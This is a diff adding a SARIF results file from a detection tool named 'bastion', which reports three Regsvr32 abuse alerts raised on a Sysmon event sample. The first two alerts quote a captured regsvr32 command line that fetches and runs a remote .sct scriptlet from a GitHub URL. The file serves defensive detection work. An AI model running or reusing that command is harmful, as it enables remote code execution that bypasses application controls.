@@ -1,0 +1,140 @@
+{
+  "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "bastion",
+          "version": "0.1.0",
+          "rules": [
+            {
+              "id": "b236190c-1c61-41e9-84b3-3fe03f6d76b0",
+              "name": "Potential Regsvr32 Commandline Flag Anomaly",
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "properties": {
+                "sigmaLevel": "medium",
+                "attackTechniques": [
+                  "T1218.010"
+                ]
+              }
+            },
+            {
+              "id": "867356ee-9352-41c9-a8f2-1be690d78216",
+              "name": "Potentially Suspicious Regsvr32 HTTP/FTP Pattern",
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "properties": {
+                "sigmaLevel": "medium",
+                "attackTechniques": [
+                  "T1218.010"
+                ]
+              }
+            },
+            {
+              "id": "c7e91a02-d771-4a6d-a700-42587e0b1095",
+              "name": "Network Connection Initiated By Regsvr32.EXE",
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "properties": {
+                "sigmaLevel": "medium",
+                "attackTechniques": [
+                  "T1559.001",
+                  "T1218.010"
+                ]
+              }
+            }
+          ]
+        }
+      },
+      "results": [
+        {
+          "ruleId": "b236190c-1c61-41e9-84b3-3fe03f6d76b0",
+          "level": "warning",
+          "message": {
+            "text": "Potential Regsvr32 Commandline Flag Anomaly [T1218.010 Regsvr32] | Image=C:\\Windows\\System32\\regsvr32.exe; CommandLine=/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "matchedFields": {
+              "Image": "C:\\Windows\\System32\\regsvr32.exe",
+              "CommandLine": "/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll"
+            },
+            "attackTechniques": [
+              "T1218.010"
+            ],
+            "eventSource": "sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx",
+            "eventTimestamp": "2019-05-13T18:03:19.681479+00:00"
+          }
+        },
+        {
+          "ruleId": "867356ee-9352-41c9-a8f2-1be690d78216",
+          "level": "warning",
+          "message": {
+            "text": "Potentially Suspicious Regsvr32 HTTP/FTP Pattern [T1218.010 Regsvr32] | Image=C:\\Windows\\System32\\regsvr32.exe; CommandLine=/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "matchedFields": {
+              "Image": "C:\\Windows\\System32\\regsvr32.exe",
+              "CommandLine": "/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll"
+            },
+            "attackTechniques": [
+              "T1218.010"
+            ],
+            "eventSource": "sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx",
+            "eventTimestamp": "2019-05-13T18:03:19.681479+00:00"
+          }
+        },
+        {
+          "ruleId": "c7e91a02-d771-4a6d-a700-42587e0b1095",
+          "level": "warning",
+          "message": {
+            "text": "Network Connection Initiated By Regsvr32.EXE [T1559.001 Component Object Model, T1218.010 Regsvr32] | Initiated=True; Image=C:\\Windows\\System32\\regsvr32.exe"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "matchedFields": {
+              "Initiated": "True",
+              "Image": "C:\\Windows\\System32\\regsvr32.exe"
+            },
+            "attackTechniques": [
+              "T1559.001",
+              "T1218.010"
+            ],
+            "eventSource": "sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx",
+            "eventTimestamp": "2019-05-13T18:03:21.212896+00:00"
+          }
+        }
+      ]
+    }
+  ]
+}
